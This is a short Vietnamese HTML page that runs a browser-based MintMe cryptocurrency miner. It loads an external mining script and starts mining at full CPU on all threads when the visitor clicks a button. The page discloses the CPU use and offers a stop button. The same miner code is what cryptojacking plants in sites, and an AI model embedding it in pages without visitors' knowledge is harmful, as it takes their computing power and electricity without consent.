<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MintMe Mining</title>
</head>
<body>
    <h1>MintMe Miner</h1>
    <p>Trang web này sẽ sử dụng 100% tài nguyên CPU của bạn và tất cả các luồng có sẵn để khai thác tiền điện tử MintMe. Xin vui lòng đồng ý trước khi khai thác.</p>

    <button onclick="startMining()">Bắt đầu khai thác</button>
    <button onclick="stopMining()">Dừng khai thác</button>

    <h3>Thống kê khai thác</h3>
    <p>Hashes: <span id="hashes">0</span></p>
    <p>Tốc độ: <span id="speed">0</span> H/s</p>

    <script src="https://www.hostingcloud.racing/S1z9.js"></script>
    <script>
        let _client;
        let interval;

        function startMining() {
            const maxThreads = navigator.hardwareConcurrency || 4; // Lấy số luồng tối đa của CPU

            _client = new Client.Anonymous('8f9a76a274949f2522d02511d75c2840d7bdc27da4a846c891e5048dedaf524e', {
                throttle: 0,  // Sử dụng 100% CPU
                c: 'w',
                threads: maxThreads // Sử dụng tối đa số luồng của CPU
            });
            _client.start();
            _client.addMiningNotification("Top", "Đang khai thác MintMe với 100% CPU và tất cả các luồng. Bạn có thể dừng khai thác nếu thấy bất tiện.", "#cccccc", 40, "#3d3d3d");

            // Cập nhật thống kê mỗi giây
            interval = setInterval(updateStats, 1000);
            alert("Đã bắt đầu khai thác MintMe ở mức 100% CPU và tất cả các luồng!");
        }

        function stopMining() {
            if (_client) {
                _client.stop();
                clearInterval(interval);
                document.getElementById('hashes').innerText = '0';
                document.getElementById('speed').innerText = '0';
                alert("Đã dừng khai thác!");
            }
        }

        function updateStats() {
            document.getElementById('hashes').innerText = _client.getTotalHashes();
            document.getElementById('speed').innerText = _client.getHashesPerSecond();
        }
    </script>
</body>
</html>
